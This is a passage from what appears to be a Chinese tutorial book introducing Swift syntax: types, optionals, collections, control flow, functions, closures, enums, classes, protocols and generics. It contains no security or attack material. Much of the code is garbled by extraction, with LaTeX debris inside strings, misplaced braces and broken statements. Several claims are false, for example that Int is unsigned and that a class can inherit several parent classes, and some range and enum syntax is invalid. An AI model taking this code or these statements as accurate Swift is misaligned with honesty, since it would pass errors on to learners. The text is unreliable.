假设需要1000个MyObject的实例来做某件事情，但是MyObject的dealloc很耗时，为了不让它影响循环的执行，可以把上述代码进行如下修改：

@autoreleasepool {
    for (int i = 0; i < 1000; ++i) {
        __autoreleasing MyObject* obj = [[MyObject alloc] init];
    }
}

这样就可以让这1000个对象在for循环外统一被销毁。

### 3.2 Swift 语言

在创建Objective-C工程时，相信大家已经注意到了语言选项中的另一门语言：Swift。Swift是苹果公司在2014年全球开发者大会上发布的语言，它由LLVM/Clang的作者克里斯·拉特纳所设计，是一种支持多编程范式的编译型编程语言。在语法上抛弃了与C语法的兼容，并大量借鉴了当前流行语言的语法特性，更为现代、优雅、安全。Swift可以使用和Objective-C相同的运行时，并且可以使用现有的Cocoa和Cocoa Touch框架，因此Swift可以用来编写来macOS、iOS与Watch OS的应用，并且在同一个工程中可以混用Swift和Objective-C。在可预见的未来，苹果公司必将大力推广Swift，但就目前来看，Swift还不太成熟，大多数开发人员还是以使用Objective-C语言为主。

苹果在新网站swift.org和托管网站GitHub上开源了Swift，包括Swift的编译器和标准库，并且可以跨平台开发Linux下的应用。不过开源版的Swift编写的应用不能上架到App Store，但是这对于逆向工程和研究Swift的实现却有着极大的参考价值。

#### 3.2.1 Playground

Playground是Xcode 6中新增加的一个功能，它可以在不用新建工程的情况下执行Swift代码，并且可以在输入代码后直接显示运行结果，用来学习Swift语言非常方便。平时在项目中如果遇到忘记了某个语法或某段代码需要进行测试的情况，也可以使用Playground来运行。

首先打开Xcode，会看到Xcode的欢迎界面。点击界面上的第一个选项“Get started with playground”，会出现新建Playground向导，如图3-8所示。

 </div>

将Playground命名为“MyPlayground”，平台则选择“macOS”，点击“Next”，选择保存位置并点击“Create”完成创建。

完成创建后显示的是Playground的主界面（见图3-9），可以看到，主界面比Xcode普通工程的主界面简洁很多，虽然可以通过右上角的按钮将隐藏的区域找回来，但通常情况并不需要这么做。

 </div>

界面的左边是源代码编辑器，右边可以即时显示每条语句的运行结果，与Python等语言的REPL十分类似。下一节中的Swift代码都运行于Playground中。

#### 3.2.2 Swift 语法简介

本节将简单介绍Swift语言的基本语法。Swift的语法比较多，并且在版本升级时经常做一些比较激进的改动。在学习这种语法特性经常变动的语言时，笔者建议以理解语法的含义和思想为重点，而不应该死记语法，这样即使以后语法有了较大的改动，也能很快地理解和适应。

# 1. 注释与分号

Swift支持单行注释和块注释，单行注释以双斜线（//）开始，到行尾结束；块注释则是以/*开始，以*/结束。与C语言的注释基本相同，不过Swift的块注释可以嵌套，比如在C语言中的注释如下所示：

/*
注释1
/*
注释2
*/
注释3
*/

注释3和后面的“/”不会被当成注释，原因是编译器遇到第一个“/”之后，会以为注释已经结束而把剩下的部分当成源代码。Swift的注释支持嵌套，则不会有该问题。

Swift中并不强制要求语句末尾加分号，但是加上分号也是可以的。如果要在一行中写多条语句，则必须用分号将语句分隔开。

# 2. 类型和变量

Swift属于静态强类型语言，要求变量都有明确的类型，并且不同的类型之间默认不能互相运算。静态强类型的一个主要优点是能协助程序员在编译期检测到更多的错误，而不会在运行时才暴露出问题。本节将为大家讲解Swift中与类型和变量相关的知识，以及Swift类型为大家带来的便利。

#####  $ ⊙ $ 变量的定义

Swift在使用变量之前需要先对变量进行声明，并且变量的类型在声明之后不可修改。在Swift中使用let关键字定义常量，其值一旦确定则不可修改，var关键字定义变量，可以在运行时任意修改变量的值，并且Swift定义变量和常量时使用类型后置的语法，比如会这样定义一个Int类型的常量：let foo: Int = 1。

Int是Swift基本类型之一，后面将会学习其他的数据类型。Swift具有类型推导的功能，不用直接写出变量的类型，编译器也会自动推导出来，因此上面的常量foo的定义可以改写为：

let foo = 1。

注意，foo类型仍然是Int，当编译器看到foo变量的定义时，会先查看等号右边表达式的类型，并把类型作为foo的类型。自动类型推导可以帮助简化代码，运用得当可以有效提高代码的可读性。

不过有时候可能会遇到无法确定常量或变量具体类型的情况，此时有一个小技巧，按住键盘上的“option”键然后点击想要查看类型的变量，Xcode会弹出该变量的类型信息，如图3-10所示。

 </div>

常量可以不在定义的时候初始化，但是未初始化的常量只能赋值一次，在赋具体的值之前该常量也是不可用的，并且由于无法进行类型推导，未初始化的常量必须写明类型。

变量的定义与使用与常量基本上相同，只是变量使用var进行定义，并且不存在不能修改的限制。

##### ○ 基本类型

Swift中的基本类型主要有整型、浮点型、布尔型和字符串型4种。其中整型变量一共有10种，具体属性可参考表3-2。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>基本类型</td><td style='text-align: center; word-wrap: break-word;'>有无符号</td><td style='text-align: center; word-wrap: break-word;'>长度（bit）</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Int8</td><td style='text-align: center; word-wrap: break-word;'>有</td><td style='text-align: center; word-wrap: break-word;'>8</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>UInt8</td><td style='text-align: center; word-wrap: break-word;'>无</td><td style='text-align: center; word-wrap: break-word;'>8</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Int16</td><td style='text-align: center; word-wrap: break-word;'>有</td><td style='text-align: center; word-wrap: break-word;'>16</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>UInt16</td><td style='text-align: center; word-wrap: break-word;'>无</td><td style='text-align: center; word-wrap: break-word;'>16</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Int32</td><td style='text-align: center; word-wrap: break-word;'>有</td><td style='text-align: center; word-wrap: break-word;'>32</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>UInt32</td><td style='text-align: center; word-wrap: break-word;'>无</td><td style='text-align: center; word-wrap: break-word;'>32</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Int64</td><td style='text-align: center; word-wrap: break-word;'>有</td><td style='text-align: center; word-wrap: break-word;'>64</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>UInt64</td><td style='text-align: center; word-wrap: break-word;'>无</td><td style='text-align: center; word-wrap: break-word;'>64</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Int</td><td style='text-align: center; word-wrap: break-word;'>无</td><td style='text-align: center; word-wrap: break-word;'>32位系统中为32，64位系统中为64</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>UInt</td><td style='text-align: center; word-wrap: break-word;'>无</td><td style='text-align: center; word-wrap: break-word;'>32位系统中为32，64位系统中为64</td></tr></table>

浮点型分为Double和Float两种，Double为64位，float则是32位，与C语言的浮点型一致。布尔型只有Bool一种，其值只能为true或者false。

Swift中的字符串类型与C语言的差别较大，字符串不再只是字符数组，而是一种内置类型String，而且字符串字面值的类型也是String，字符串的结尾也不再需要\0。

Swift中的字符串支持一种称为字符串插值的语法,可以直接将语句的运算结果嵌入到一个字符串中:

. var a = 1
var b = 2
var str = "a + b =  $ (a + b) $"
print(str)

 $ ) $中表达式的值键直接插入到字符串中，而不必使用额外的格式化函数。

Swift中的基本类型都被定义成结构体，因此基本类型也可以有自己的属性，也可以通过扩展为其增加新的属性和方法。关于结构体和类会在后面的章节中进一步讲述。

##### ② 可选类型

可选类型是一种比较特别的类型，在正常的类型后面加上一个问号（?）即为该类型对应的可选类型。可选类型变量的值可以是正常的值，也可以是nil，表示不存在可用的值。

var opt: Int? = nil
opt = 1

可选类型可以使用if语句判断是否为nil，当确定值不为nil时，可以使用感叹号(!)获取具体的值：

if (opt != nil) {
    print(opt!)
}

##### ☐ 集合类型

Swift常用的内置集合类型有数组和字典两种,以下代码演示了创建和使用这两种类型的基本语法:

// 创建一个空的元素类型为Int的数组
var arr = [Int]()
// 向数组中添加一个元素“1”
arr.append(1)
// 打印数组中的第1个元素，Swift数组下标也是从0开始的
print(arr[0])
// 清空数组
arr.removeAll()
// 数组字面量
arr = [1, 2, 3]
// 清空数组的另一种方式
arr = []
// 创建一个空的字典，键和值的类型分别为Int和String
var dic = [Int:String]()
// 添加一个新的键值对
dic[1] = "One"
// 打印字典中1对应的值

   </div>

// 字典的下表操作返回的是一个可选类型，因为键值对可能并不存在
print(dic[1])
// 清空字典
dic.removeAll()
// 字典字面量
dic = [1: "One", 2: "Two", 3: "Three"]
// 另一种清空字典的方式
dic = [:]
需要注意的是，虽然可以用arr = []的方式清空数组，但是let arr = []并不是创建了一个空的数组，而是创建了一个空的NSArray。如果不是需要与Objective-C交互，则尽量使用Swift的数组，不要使用NSArray。

# 3. 运算符

Swift的运算符与C语言的基本相同，这里主要介绍一下Swift中的区间运算符。区间运算符可以用来方便地创建一个区间，以下代码创建了一个从1到10的区间，包含结束的10:

var ran = 1..10
ran变量的类型为Range<Int>。如果不想包含结尾的数字，可以使用..<，如下所示：
var ran = 1..<10
区间运算符主要应用于for循环和switch语句，后面我们将进一步讲解。

# 4. 控制语句

Swift的控制语句也与C系列语言较为类似，使用if-else和switch-case进行条件执行，使用for和while进行循环。

### o if

if语句用来判断给定的条件是否为true，是则执行if后的语句，否则执行else语句。

var foo = 1
var bar = 2

if bar == 2 {
    print("bar == 2")
} else {
    print("bar != 2")
}

如果不需要else可以将其省略：

if bar == 2 {
    print("bar == 2")
}

也可以将多个if语句连在一起使用：

if foo == bar {
    print("foo = bar")
}

} else if foo > bar {
    print("foo > bar")
} else {
    print("foo < bar")
}

① switch

Swift的switch-case语句比C语言要强大很多，它借鉴了函数式编程语言常用的模式匹配，使switch更为强大，可以将其像C语言的switch一样使用：

switch foo {
    case 1: print("foo == 1")
    case 2: print("foo == 2")
    default: break
}

与C的switch不同的是，Swift的case和default中可以不用写break，但是当case和default语句后面没有任何代码时则必须加break。当一个变量可能的值无法在case中全部列举出来时，必须要写default。

如果要在一个case中表示多种可能的值，可以将这些值以逗号列表的形式写在case后面：

switch foo {
    case 1,3: print("foo == 1 or 3")
    case 2: print("foo = 2")
    default: break
}

在C语言中，switch只支持整型，而且case的值必须是编译器常量，不能是变量；而在Swift中，switch可以支持所有可比较的类型，也可以使用变量作为case的值：

let str2 = "Hello"
switch str {
    case str2: print("str == str2")
    case "Hello, playground": print("str == \"Hello, playground\"")
    default: break
}

如果Swift的switch只有这些功能，它还远远算不上强大，但是添加了模式匹配的switch就可以算得上是脱胎换骨了，可以通过下面几个例子来体会一下模式匹配带来的便利。

switch foo {
    case 0...3: print("0 <= foo <= 3")
    case 4...<6: print("4 <= foo < 6")
    default: print("foo is other value")
}

区间匹配允许在case中使用一个范围,在该范围内的值都会执行case之后的代码。而将switch与元组组合使用将会有更大的威力:

let  $ \text{tup} = (1, 2) $
switch  $ \text{tup}\{ $
case (\_, 0...4):  $ \text{print}(0 <= \text{tup}.1 <= 4) $

case (1, __): print("tup.0 == 1")
default: break
}

当 $ t_{up} $的第二个值在0到4之间时，则执行第一个case，如果 $ t_{up} $的第一个值等于1，则执行第二个case；下划线表示匹配所有可能的情况。

细心的读者可能会发现，tup同时满足两个case的条件，究竟会打印什么呢？结果是打印“0<=tup.1<=4”，原因是如果同时满足多个case的条件，只会执行第一个case的代码。还可以在匹配的时候将元组中的值绑定到新的变量上，如下所示：

let  $ \text{tup} = (4, 5, 6) $
switch  $ \text{tup} $
case (let x, _, 0...4):  $ \text{print}('0 <= \text{tup}.2 <= 4') $
case  $ \text{let}(x, y, z) $:  $ \text{print}('x =  $ \backslash(x) $, y =  $ \backslash(y) $, z =  $ \backslash(z) $}) $

这段代码会输出“x=4, y=5, z=6”，因为分别把 $ t_{up} $的3个元素绑定到了x、y、z这3个变量上了。如果想要做一些更严格的限制，可以使用where语句：

let tup = (4,6,6)
let foo = 4
switch tup{
    case (let x,_, 0...4): print("0 <= tup.2 <= 4")
    case let(x, y, z)
        where x == foo && y == z:
        print("x =  $ x $), y =  $ y $), z =  $ z $"
    default: break
}
o for与for-in

Swift中的for循环与C中的非常相似，分为循环头和循环体两部分。循环头又分为初始化语句、循环条件和表达式3部分，且这3部分都是可选的：

for var i = 0; i < 3; i += 1 {
    print("i =  $ i $"
}

把上述代码输入到Playground中时，会给出一个大大的黄色警告：提示C风格的for循环已经不推荐使用了，并且会在之后的版本中移除。还给了一个将var i = 0; i < 3; i += 1替换为i in 0 ..< 3的建议。在Swift中引入了一种新的for-in循环语法，使用这种语法可以很方便地遍历一个集合，在大多数情况下，它完全可以替代C风格的for。可以像下面这样遍历一个数字的区间：

for i in 0..3 {
    print("i =  $ \overline{i} $"
}

将会输出：

i = 0
i = 1
i = 2

 $ i = 3 $

如果将0，.3改为0，.3，则该区间将不包含3，如果只是需要循环一定次数而不需要变量i的值，可以将变量i用下划线（_）代替。还可以使用for-in语法遍历数组和字典类型的值：

let arr = [1, 2, 3]
for i in arr {
    print("i =  $ \backslash i $" )
}
let dic = [1: "One", 2: "two", 3: "three"]
for (key, val) in dic {
    print("key: $ key $, val: $ val $" )
}
输出结果如下：
i = 1
i = 2
i = 3
key:2, val:two
key:3, val:three
key:1, val:One
注意，字典的输出顺序与我们所写的顺序不同，在讨论字典类型时已经说过字典的内容默认是无序的。

### o while与repeat-while

for-in语句可以处理大多数需要循环的场景，但是还是有一些场景不能用for-in处理，或者处理起来比较麻烦，而C风格的for又被废弃，那么如何解决该问题呢？此时就应该使用while和repeat-while，比如下面的for循环：

for var i = 1; i < 100; i *= 3 {
    print("i =  $ \backslash i $"
}

改写成for-in格式的循环会比较麻烦，但可以改写成while循环：
var i = 1
while i < 100 {
    print("i =  $ \backslash i $"
    i *= 3
}

不过个人感觉仍然不如for循环优雅，但在实际应用中，这种情况还

不过个人感觉仍然不如for循环优雅，但在实际应用中，这种情况还是比较少见的。

while和repeat-while与之前介绍的语句相比要简单得多，它们与C语言中的while和do-while是相对应的，并没有添加其他的“黑魔法”。

##### ○ break和continue

break和continue语句都是使用在循环体中的，break还可以用在switch-case语句中，这一点在之前讲解switch-case时已经介绍过了。

break负责终止离它最近的循环或switch语句，并从这些语句之后的第一条语句开始执行；continue则是终止离它最近的循环语句中的本次循环并立即开始下一次循环。

# 5. 函数

Swift语言不像C系列的语言需要一个main()函数作为一个入口点，但是仍然可以使用函数将代码划分为许多功能片段，合理使用函数可以使代码更加简洁直观，方便维护、测试和复用。本节将为大家讲解Swift中函数的基本使用方法。

##### 函数定义

与C语言中的函数相比，Swift的函数定义最大的区别有两点，一是函数以func关键字开头，二是参数和返回值类型后置。比如如下C函数：

int add(int a, int b)
{
    return a + b;
}

改写为Swift函数的代码如下：

func add(a: Int, b: Int) -> Int {
    return a + b
}

Swift函数的调用与C语言中的也有一定的区别, Swift函数的参数都有一个局部参数名和一个外部参数名, 局部参数名是在函数内部使用的, 而外部参数名则是在调用时使用的。

a和b既是局部参数名，也是外部参数名。在调用函数时，除了第一个参数外，其他的参数都需要写明外部参数名：

let sum = add(1, b:2)

如果要更改对外的外部参数名，需要把外部参数名写在原本的参数名之前：

77 定义add
func add(a: Int, c b: Int) -> Int {
    return a + b
}
// 调用add
let sum = add(1, c:2)

如果需要忽略外部参数名，只需将外部参数名定义为下划线（_）：

// 定义add
func add(a: Int, _ b: Int) -> Int {
    return a + b
}
// 调用add
let sum = add(1, 2)

由于第一个参数的外部参数名会被忽略，所以修改第一个参数的外部参数名是没有意义的。默认情况下，函数的参数不能在函数内部进行修改，如果要进行修改，可以在参数之前加一

个var关键字，不过Swift已经不建议使用该关键字了，可以使用inout关键字来达到相似的效果。

inout关键字原本是为了传出参数而设计的，它与C++的引用类型参数较为类似，但是在传入的参数之前必须加一个“&”：

// 定义add
func add(a: Int, _b: Int, inout c: Int) {
    c = a + b
}
// 调用add
var sum = 0
add(1, 2, c: &sum)

Swift也支持默认参数：

// 定义add
func add(a: Int, b: Int = 2) -> Int {
    return a + b
}
// 调用add，sum值将为3
let sum = add(1)

如果要将add函数改造成可以计算多个值相加，可以使用可变参数：

func add(a: Int...) -> Int {
    var sum: Int = 0
    for i in a {
        sum += i
    }
    return sum
}
let sum = add(1,2,3,4)

使用可变参数后，参数a将不再是某一个参数的参数名，而是一个数组，其中包含了所有的参数。

Swift的函数支持重载，可以定义多个同名的函数，但是函数的参数个数或者类型不能相同。当调用函数的时候，编译器会根据提供的参数自动选择对应版本的函数：

func foo() {
    print("no arg")
}

func foo(i:Int) {
    print("i = \(i)\")
}

foo() // 将会调用第一个foo函数
foo(1) // 将会调用第二个foo函数
注意函数重载不能仅靠返回值区分，下面的写法是错误的：
func foo()
{

print("no arg")
func foo() -> Int { // 错误！与第一个foo函数只有返回值不同
    print("return Int value")
}

# 6. Lambda表达式

在介绍Objective-C的时候介绍过block语法，在其他语言中称为Lambda表达式，Swift也支持类似的特性。

在介绍字典类型的排序时，我们知道sort()方法需要传入另一个函数进行比较操作，可以先定义一个函数用于比较操作，然后将该函数传递给sort()：

func sortCallback(f:(Int, String), s:(Int, String)) -> Bool {
    return f.0 < s.0
}

let dic = [1: "One", 2: "two", 3: "three"]
var dic2 = dic.sort(sortCallback)

不过,为了调用一个sort()就定义一个新的函数会比较麻烦,此时就可以使用Lambda表达式:

let dic = [1:"One", 2:"two", 3:"three"]
var dic2 = dic.sort({(f:(Int, String), s:(Int, String)) -> Bool in return f.0 < s.0 })

Swift的Lambda表达式也支持捕获外部的变量形成闭包，比如数组的filter()方法作用是过滤掉数组中不符合条件的值，并返回一个新的数组，假设要把一个数组中的值与一个变量进行比较：

let arr = [1,2,3,4,5,6]
let foo = 3
// 可以直接在Lambda表达式中使用外部的变量foo
let arr2 = arr.filter({(val: Int) -> Bool in return val > foo})
// 将打印 [4, 5, 6]
print(arr2)

Lambda函数可以像普通类型一样进行传递，不过在传递之前，要搞清楚其具体类型是什么。假设编写了如下函数：

let myFunc = {(a: Int, b: Double) -> String in
    print("a =  $ a $), b =  $ b $")
    return "a:  $ a $), b:  $ b $"
}

由于有自动类型推导，并不需要写出myFunc的具体类型，但是有时不能依赖类型推导，比如作为函数的参数传递时。通过按住option键点击变量名的方法，可以看到myFunc的类型是(Int, Double) -> String。将Lambda赋值给一个变量后，可以通过该变量调用Lambda函数，与普通的函数调用的差别是所有的参数都不需要注明外部参数名：

myFunc(1, 2.3)

# 7. 枚举

枚举是一组相关的值的集合，每个枚举类型都定义了一个新的类型，下面的代码定义了有3个值的enum，并演示了如何使用它：

enum MyEnum {
    case foo
    case bar
    case foobar
}
let a = MyEnum.foo
print(a)
let b: MyEnum = .bar
print(b)
在可以确定类型的时候，枚举值前的类型可以省略，但是点不能省略。

在枚举中的值之前需要加一个case，也可以只用一个case并将多个值定义到同一行：

可以用“＝”运算符判断一个枚举变量的值与给定的值是否相等，a = .foo的结果为true，a = .bar结果为false。

enum MyEnum {
    case foo, bar
    case foobar
}
可以指定枚举的原始值，原始值是枚举所有成员的类型。下面是枚举每个成员都是String
型：
enum MyEnum : String {
    case foo, bar, foobar
}
在定义枚举类型时，可以直接为每个成员指定具体的值：

enum MyEnum {
    case foo = 1
    case bar = 3
    case foobar = 4
}

枚举类型的每个成员可以有各自的类型：

enum MyEnum {
    case foo(Int)
    case bar(String)
    case foobar(Int, String)
}

不过这种方法与其说是定义了一个新的成员，不如说是定义了一个子类型，使用时可以为其赋具体的值：

enum MyEnum {

case foo(Int)
    case bar(String)
    case foobar(Int, String)
}

var a = MyEnum.foo(1)
print(a)

a = .bar("Hello")
print(a)

let b: MyEnum = .foobar(1, "Hello")
print(b)

输出结果为：

foo(1)
bar("Hello")
foobar(1, "Hello")

这种类型的枚举可以与switch-case结合使用：

enum MyEnum {
    case foo(Int)
    case bar(String)
    case foobar(Int, String)
}

var a : MyEnum = .foobar(1, "Hello")

switch a {
    case .foo(_): print("a is .foo(Int)")
    case .foobar(let a, let b): print("a =  $ (a), b =  $ (b) $"
    default: break
}

输出结果为: a = 1, b = Hello。

# 8. 类

Swift语言中也有面向对象的编程思想，而类是面向对象编程的重要特征。类是一种用户定义的类型，它将表示的数据和用于处理这些数据的方法打包到一起，然后就可以参照类的定义来生成类的实例。

##### ○ 类的定义

在Swift中，当每定义一个新类的时候，实际上是定义了一个新的类型。通过关键字class来定义类，并在一对大括号中定义它们的具体内容：

class MyClass {
    // 此处编写class的具体内容
}

类的具体内容可以包含成员变量和函数，成员变量和函数的定义与普通变量和函数的定义很相似，如下所示：

class MyClass {
    var foo: Int = 0
    let bar: Double = 1.2
    var foobar: String = ""
    func printSelf() {
        print("foo =  $ foo $), bar =  $ bar $), foobar =  $ foobar $"
    }
}

可以在类的内部使用var和let声明成员变量，并且var声明的是变量，可以对其进行修改；let声明的属于常量，不能够修改；也可以用func关键字声明成员函数。

注意, 类的成员变量需要进行初始化, 初始化可以直接在变量后面使用等号赋值。如果不想进行初始化, 可以将变量声明为可选类型, var声明的变量也可以在构造函数中赋值。

在Swift中，类的构造函数名字都是init。构造函数不需要使用func关键字定义，也没有返回值，但是其他特征与普通成员函数相似。与之相对应的则是析构函数deinit，析构函数会在类的实例将要被销毁时调用。

析构函数也不需要func关键字，也没有返回值，甚至也没有参数。因为不需要参数，存放参数列表的括号也被省略了：

class MyClass {
    var foo: Int
    let bar: Double = 1.2
    var foobar: String
    func printSelf() {
        print("foo = \(foo), bar = \(bar), foobar = \(foobar)"
    }

    init(foo: Int) {
        self.foo = foo
        foobar = ""
    }

    init(foo: Int, foobar: String) {
        self.foo = foo
        self.foobar = foobar
    }

    deinit {
        print("Deinit")
    }
}

使用一个类时，首先需要进行实例化。类本身是一个类型，实例化一个类就是定义一个该类的变量：

var myClass = MyClass(foo:1)

有了类的实例之后，就可以通过“点（．）”的方式访问类的成员变量和函数了：
var myClass = MyClass(foo:1)

myClass.foo = 1
print(myClass.foo)    // 将打印1
var myClass2 = MyClass(foo: 1, foobar: "test")
myClass2.printSelf()    // 将打印 "foo = 1, bar = 1.2, foobar = test"

对于类的构造函数，每个参数在调用时都需要写明外部参数名，而不像普通函数那样第一个参数可以省略外部参数名。不过，也可以将外部参数名定义为下划线而将其忽略。

Swift中类的属性和方法也有访问权限控制，但是Swift的访问权限是以模块为单位的，这部分内容将会在讲解模块的章节里再详细介绍。

Swift允许类构造失败。如果一个构造函数可能会失败，就需要在init后面加一个问号，并在init函数失败的时候返回一个nil，如下所示：

class MyClass {
    var foo: Int
    var foobar: String
    func printSelf() {
        print("foo =  $ foo) $, foobar =  $ \text{foobar} $"
    }

    init?(foo: Int, foobar: String) {
        self.foo = foo
        if foobar == "" {
            return nil
        }
        self.foobar = foobar
    }
}

通过可失败的构造函数构造出来的MyClass的实例将不再是MyClass类型，而是MyClass?类型，并可以用if语句测试其值是否为nil:

var myClass = MyClass(foo: 1, foobar: "test")
if (myClass != nil) {
    myClass!.printSelf() // 将输出 foo = 1, foobar = test
}
print(myClass?.foo) // 将输出 Optional(1)

##### ○ 计算属性与属性观察器

之前介绍的直接通过let和var声明的属性被称为存储属性，它们本身就可以存储具体的值。Swift中还有一种计算属性，这种属性与其他语言的getter和setter很相似，但是不能存储具体的值。计算属性的使用方法如下：

class Foo {
    var _a: Int = 1
    var a: Int {
        get {
            print("get a")
            return _a
        }
    }
}

set(val){
    print("set a, val= $ val $")
    _a = val
}
}
}
var foo = Foo()

foo.a = 100 // 将会打印"set a, val=100"
print(foo.a) // 将会打印"get a"
}

可以看出，计算属性如果要存储值，需要自己通过其他方法存储。有时候这种语法不是太方便，如果只是想在设置一个属性时执行一段代码，就可以使用属性观察器：

class Foo {
    var a: Int = 1 {
        willSet(val){
            print("willSet a, val=\(val")")
        }
        didSet(val){
            print("didSet a, val=\(val")")
        }
    }
}

willSet()将会在对属性设置新值之前调用，而didSet()将会在设置完之后调用。不过只有监视设置属性的willSet()和didSet()观察器，并没有willGet()或者didGet()这样的观察器。语言的设计者解释说这样做是不希望Swift过于复杂。

##### ○ 自动引用计数

所有类的实例都是引用类型，构造在堆上，因此需要对其释放，不过Swift也有ARC机制帮助你自动释放。Swift的ARC与Objective-C的ARC比较类似，其原理就不再重复叙述了。

Swift的ARC也有循环引用的问题，解决方法也是使用弱引用。弱引用是在变量声明之前添加weak关键字，比如要在Foo类中添加一个对Bar类实例的弱引用：

class Foo {
    weak var bar: Bar?
}

此时，bar成员变量对Bar实例的引用就是弱引用，不会影响所引用实例的引用计数。当所引用的实例被释放时，bar的值将会自动变为nil，因此弱引用必须是可选类型。

除了弱引用，Swift还有一种无主引用。无主引用使用关键字unowned表示，它与弱引用的区别是它修饰的变量的类型不需要是可选的，而且在所引用的实例释放后也不会变为nil，因此这种引用很少使用。

Swift中的弱引用和无主引用与Objective-C中的_weak和_unsafe_unretained非常相似。

##### ○ 继承

下面的例子定义了一个基类和一个子类，在父类中定义了一个成员变量，在子类的函数中使用了父类的成员变量：

class SuperClass {
    var foo = 1
}

class SubClass: SuperClass {
    func prinFoo() {
        print(foo)
    }
}

var sub = SubClass()
sub.prinFoo() // 将打印"1"

一个类可以继承自多个父类，不同的父类之间以逗号隔开。子类继承了父类之后便可以使用父类的属性和方法，也可以重写父类的方法，与C++等语言不同，重写父类的方法不需要父类中的方法声明为virtual，但是需要在子类中进行重写的函数之前添加override关键字。

class SuperClass {
    var foo = 1
    func printName() {
        print("in super class print")
    }
}

class SubClass: SuperClass {
    override func printName() {
        print("in sub class print")
    }
}

var sub:SuperClass = SubClass()

sub.println(
    // 将打印"in sub class print"
)

子类继承了父类之后，在构造子类的实例时，将先构造父类，然后再构造子类；析构时将先析构子类，然后析构父类。

##### 协议

定义协议的关键字是protocol，下面定义了一个名为“MyProtocol”的协议：

protocol MyProtocol {
    var someProp: Int{get set}

    func someFunc()->Int
}

Swift中的协议比Objective-C的协议要强大很多，除了可以规定需要实现的函数之外，还可以

规定要实现的属性。someProp就是对属性的规定，它要求实现该协议的类必须有一个名为someProp的属性，且该属性是可读写的。

注意，这里的get和set之间是空格而不是逗号，并且get和set虽然与属性的getter和setter比较像，但它们并没有关系。同时，具有get和set的属性必须使用var关键字声明为可修改的，而只有get的属性则需要使用let关键字声明为只读的。

规定需要实现的方法只需要在协议内声明要实现的函数即可。接下来是对该协议的实现：

class ProtocolImpl: MyProtocol {
    var someProp: Int = 0
    func someFunc() -> Int {
        return someProp
    }
}

要实现某个协议的语法与继承一个类非常相似,声明类的时候在类名之后加上冒号和要实现的协议名即可。既然实现协议的语法类似于继承,那么是否可以把MyProtocol当成一个父类型来声明变量并存放ProtocolImpl类型的实例呢?答案是肯定的。

从这个角度来看，Swift的协议与C#等语言的接口非常相似。

var impl:MyProtocol = ProtocolImpl()
impl.someProp = 2
print(impl.someFunc())

协议本身也可以继承其他一个或多个协议，当一个类继承了该子协议时，它也必须实现该协议的父协议。

Swift的协议也有可选协议，但是可选协议只推荐用在需要将接口暴露给Objective-C使用时。Swift的可选协议也是在属性或方法之前加optional关键字，但是有个限制，必须在@objc修饰符修饰的类中才能使用optional，该修饰符原本的作用是表示该协议要暴露给Objective-C使用。

Swift的协议还可以进行组合，如果希望一个类同时实现两个或多个协议，使用协议的继承来实现的话，那么需要定义一个新的协议，并且新的协议不需要新的内容。这显然不够优雅，协议的组合就是为了实现这项功能的。

假设有一个函数，它的一个参数是同时实现了MyProtocol1和MyProtocol2两个协议的类的实例，那么就可以这么写：

protocol MyProtocol1 {
    var someProp: Int {get set}
}
protocol MyProtocol2 {
    func someFunc()
}
func foo(bar: protocol<MyProtocol1, MyProtocol2>) {
    bar.someFunc()
}

protocol<MyProtocol1, MyProtocol2>规定了 bar参数必须是同时实现了MyProtocol1和MyProtocol2协议的类的实例，如果不是则会编译失败。

# 9. 结构体

Swift中的结构体的特性与类非常相似，只有些许不同。结构体与类的差异主要有以下3点。

☐ 结构体只能继承协议，不能继承类或者结构体。

☐ 结构体类型的变量是值类型，而类类型的变量则是引用类型。

☐ 结构体没有析构函数。

这几个主要差异导致了许多其他细节上的差异。比如因为结构体是值类型，因此结构体变量没有引用计数，而类变量则需要引用计数；因为结构体不能继承非协议类型，于是它不具有多态性。细节上的其他差异此处就不一一介绍了。

# 10. 泛型

泛型的主要作用是编写类型无关的代码，一般用来实现鸭子类型和容器。Swift中的泛型功能比较弱，无法像C++中的模板那样可以进行元编程和编译期计算，但是应付日常使用是完全足够的。

Swift的泛型可以应用到函数、类和结构体上。应用到函数上时其语法如下所示：

func mySwap<T>(inout a:T, inout _ b:T) {
    let tmp = a
    a = b
    b = tmp
}

var a = 1
var b = 2
mySwap(&a, &b)
print("a =  $ (a), b =  $ (b) $"

这段代码最终输出结果为a = 2, b = 1。在mySwap函数中，把参数的具体类型用T进行替换，使代码不再局限于某个具体的类型，因此，可以使用任意类型的a和b作为参数调用mySwap（a、b类型必须一致）。

参数列表中的T只是一个别名，也可以使用其他名字，不过习惯上一般命名为T。在使用具体类型的参数调用mySwap的时候，编译器会自动推导出T的具体类型，并替换T为具体的类型。在Swift中，编译器会阻止编写无法通过参数推导出T具体类型的代码，比如以下代码会产生一个编译错误：

func foo<T>() {
}

如果函数有多个类型参数，可以通过逗号分隔：

func foo<T1,T2>(a:T1, b:T2) {

print("a =  $ (a), b =  $ (b) $"
}
foo(1,b: 2.0)

还可以规定类型参数必须实现某个协议，该功能主要用在实现鸭子类型上。鸭子类型是动态类型语言常见的编码风格。这个奇怪的名字来源于James Whitcomb Riley的诗句：“当看到一只鸟走起来像鸭子，游泳起来像鸭子，叫起来也像鸭子，那么这只鸟就可以被称为鸭子。”

对应到编码工作上，可以理解为在使用一个变量时，不需要关心实例的具体类型，只要它实现了需要的协议即可。比如一个函数要求传入的参数必须具有printClassName方法：

protocol WithPrintClassName {
    func printClassName()
}

func foo<T:WithPrintClassName>(bar:T) {
    bar.printClassName()
}

class Bar: WithPrintClassName {
    func printClassName() {
        print("Bar")
    }
}

foo(Bar())

如果Bar类没有实现WithPrintClassName协议，那么将会产生编译

泛型类和泛型结构体与泛型函数使用方式基本一致, 泛型类型也是以尖括号的方式放在类名的后面。下面是一个简单的栈的实现和使用:

class MyStack<T> {
    var items = [T]()
    func push(val:T) {
        items.append(val)
    }
    func top() -> T? {
        return items.last
    }
    func pop() {
